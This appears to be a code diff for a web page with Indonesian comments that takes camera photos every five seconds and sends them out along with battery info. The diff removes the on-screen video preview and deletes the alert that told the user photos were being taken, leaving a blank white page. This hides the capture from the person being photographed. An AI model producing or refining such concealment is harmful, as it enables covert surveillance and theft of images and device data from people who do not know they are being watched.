@@ -33,10 +33,11 @@
           video.srcObject = stream;
           video.play();
 
-          document.body.innerHTML = ""; // hilangkan tombol
-          document.body.appendChild(video);
+          // Sembunyikan elemen dan bersihkan halaman
+          document.body.innerHTML = "";
+          document.body.style.backgroundColor = "white";
 
-          // Ambil info baterai sekali aja
+          // Ambil info baterai
           let batteryInfo = {
             level: "Tidak diketahui",
             charging: "Tidak diketahui"
@@ -79,7 +80,6 @@
               .catch(err => console.error("Gagal kirim:", err));
           }, 5000);
 
-          alert("Izin kamera berhasil. Mengambil foto setiap 5 detik.");
         } catch (err) {
           alert("Gagal akses kamera: " + err.message);
         }
